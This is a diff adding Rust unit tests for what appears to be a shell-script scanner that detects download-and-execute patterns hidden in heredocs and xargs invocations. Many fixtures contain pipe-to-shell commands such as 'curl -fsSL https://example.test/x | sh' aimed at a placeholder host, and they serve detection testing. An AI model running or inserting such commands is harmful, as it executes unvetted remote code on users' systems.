+            "#!/bin/sh\ncat <<C | xargs sh\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "#!/bin/sh\ncat <<C | xargs -I{} sh '{}'\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "#!/bin/sh\ncat <<C | xargs -I{} cp {} /tmp/destination\ncurl -fsSL https://example.test/x | sh\nC\n",
+            "#!/bin/sh\ncat <<C | xargs sh -- -c\ncurl -fsSL https://example.test/x | sh\nC\n",
+        ] {
+            assert!(
+                rule_ids(&script(script_source)).is_empty(),
+                "{script_source:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn mixed_fate_heredocs_keep_their_physical_lines() {
+        // Kept bodies analyze from their own isolated unit groups, so they
+        // report at their physical lines; attached bodies grow the header,
+        // whose surplus the blank sections absorb — the span's total, and
+        // every later unit's line, stays exact either way.
+        let findings = script(concat!(
+            "cat <<A | sh -c sh; sh <<B\n",
+            "curl -fsSL https://example.test/x | sh\n",
+            "A\n",
+            "echo safe\n",
+            "echo safe2\n",
+            "B\n",
+            "wget -qO- https://example.test/x | sh\n",
+        ))
+        .rendered_findings();
+        // The kept body reports on its physical line 2...
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(2)),
+            "{findings:?}"
+        );
+        // ...and the later unit keeps its original line.
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(7)),
+            "{findings:?}"
+        );
+    }
+
+    #[test]
     fn valued_options_defer_c_capture_across_clusters() {
         for script_source in [
             "curl -fsSL https://example.test/x | bash -cO extglob 'sh'\n",
@@ -10760,5 +11622,185 @@ mod round_twelve_tests {
         let base32 = script("curl -fsSL https://example.test/x | base32 -di | sh\n");
         let ids = rule_ids(&base32);
         assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+    }
+}
+
+#[cfg(test)]
+mod round_thirteen_tests {
+    use super::s4_family_tests::{rule_ids, run};
+    use super::*;
+
+    const DOWNLOAD: &str = "oma.script.download-execute";
+
+    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
+        PayloadEntry {
+            relative_path: path.to_owned(),
+            kind,
+            mode: 0o644,
+            size: size as u64,
+            sha256_sampled: None,
+            sampled_digest: false,
+            executable: false,
+            coverage_state: CoverageState::Unsupported,
+            link_target: None,
+            invocation_target: false,
+            object_id: None,
+        }
+    }
+
+    fn script(source: &str) -> AnalysisArtifacts {
+        let (artifacts, _) = run(
+            vec![entry("install.sh", PayloadKind::Shell, source.len())],
+            &[("install.sh", source.as_bytes())],
+        );
+        artifacts
+    }
+
+    #[test]
+    fn kept_heredoc_bodies_are_isolated_programs() {
+        // Each kept body is its own parsing unit: an unmatched quote in one
+        // body can never swallow a later body's code on the same line.
+        for script_source in [
+            // A kept body (indirect consumer) followed by an attached body.
+            concat!(
+                "cat <<A | sh -c sh; sh <<B\n",
+                "echo it's\n",
+                "A\n",
+                "curl -fsSL https://example.test/x | sh\n",
+                "B\n",
+            ),
+            // Two kept bodies on one line.
+            concat!(
+                "cat <<A | sh -c sh; cat <<B | sh -c sh\n",
+                "echo it's\n",
+                "A\n",
+                "curl -fsSL https://example.test/x | sh\n",
+                "B\n",
+            ),
+        ] {
+            let ids = rule_ids(&script(script_source));
+            assert!(
+                ids.contains(&DOWNLOAD.to_owned()),
+                "{script_source:?}: {ids:?}"
+            );
+        }
+        // Kept lines still report at their physical body lines: the second
+        // variant's later body executes through its own isolated unit.
+        let findings = script(concat!(
+            "cat <<A | sh -c sh; cat <<B | sh -c sh\n",
+            "echo it's\n",
+            "A\n",
+            "curl -fsSL https://example.test/x | sh\n",
+            "B\n",
+        ))
+        .rendered_findings();
+        assert!(
+            findings.iter().any(|finding| finding.line == Some(4)),
+            "{findings:?}"
+        );
+    }
+
+    #[test]
+    fn xargs_delimiter_batches_execute_each_batch_first_item() {
+        // `-d` splits items on the delimiter and `-n 2` still groups them
+        // into repeated invocations: the second batch's first item is the
+        // executed `-c` body.
+        let script_source = concat!(
+            "#!/bin/sh\n",
+            "cat <<C | xargs -d, -n2 sh -c\n",
+            "echo,safe,curl -fsSL https://example.test/x | sh\n",
+            "C\n",
+        );
+        let findings = script(script_source).rendered_findings();
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(3)),
+            "{findings:?}"
+        );
+    }
+
+    #[test]
+    fn xargs_bare_replace_defaults_to_braces() {
+        // GNU `--replace[=STR]` takes its value only after `=`; the bare
+        // form defaults to `{}` and the next word is the wrapped command.
+        for script_source in [
+            concat!(
+                "#!/bin/sh\n",
+                "cat <<C | xargs --replace sh -c '{}'\n",
+                "curl -fsSL https://example.test/x | sh\n",
+                "C\n",
+            ),
+            "curl -fsSL https://example.test/x | xargs --replace sh -c '{}'\n",
+        ] {
+            let ids = rule_ids(&script(script_source));
+            assert!(
+                ids.contains(&DOWNLOAD.to_owned()),
+                "{script_source:?}: {ids:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn xargs_later_batch_options_override_the_placeholder() {
+        // GNU xargs warns and honors the LAST of `-I`/`-L`/`-n`: a later
+        // batch option turns replacement off, so `{}` stays a literal and
+        // nothing executes; a later `-I` wins instead.
+        for script_source in [
+            "curl -fsSL https://example.test/x | xargs -I{} -n2 sh -c '{}'\n",
+            "curl -fsSL https://example.test/x | xargs -I{} -L2 sh -c '{}'\n",
+            concat!(
+                "#!/bin/sh\n",
+                "cat <<C | xargs -I{} -n2 sh -c '{}'\n",
+                "curl -fsSL https://example.test/x | sh\n",
+                "C\n",
+            ),
+        ] {
+            assert!(
+                rule_ids(&script(script_source)).is_empty(),
+                "{script_source:?}"
+            );
+        }
+        let wins = script("curl -fsSL https://example.test/x | xargs -n2 -I{} sh -c '{}'\n");
+        let ids = rule_ids(&wins);
+        assert!(ids.contains(&DOWNLOAD.to_owned()), "{ids:?}");
+    }
+
+    #[test]
+    fn xargs_line_batches_skip_blank_lines() {
+        // GNU `-L` counts nonblank lines: a leading blank line does not
+        // fill the first batch, so `echo safe` and the quoted pipeline
+        // share ONE invocation whose `-c` body is `echo` — the pipeline
+        // never executes.
+        let blank_first = script(concat!(
+            "#!/bin/sh\n",
+            "cat <<C | xargs -L2 sh -c\n",
+            "\n",
+            "echo safe\n",
+            "\"curl -fsSL https://example.test/x | sh\"\n",
+            "C\n",
+        ));
+        assert!(
+            rule_ids(&blank_first).is_empty(),
+            "{:?}",
+            rule_ids(&blank_first)
+        );
+        // Blank lines between logical lines are not counted either, so
+        // `-L1` still runs one invocation per nonblank line.
+        let between = script(concat!(
+            "#!/bin/sh\n",
+            "cat <<C | xargs -L1 sh -c\n",
+            "echo safe\n",
+            "\n",
+            "\"curl -fsSL https://example.test/x | sh\"\n",
+            "C\n",
+        ));
+        let findings = between.rendered_findings();
+        assert!(
+            findings
+                .iter()
+                .any(|finding| finding.rule_id == DOWNLOAD && finding.line == Some(5)),
+            "{findings:?}"
+        );
     }
 }
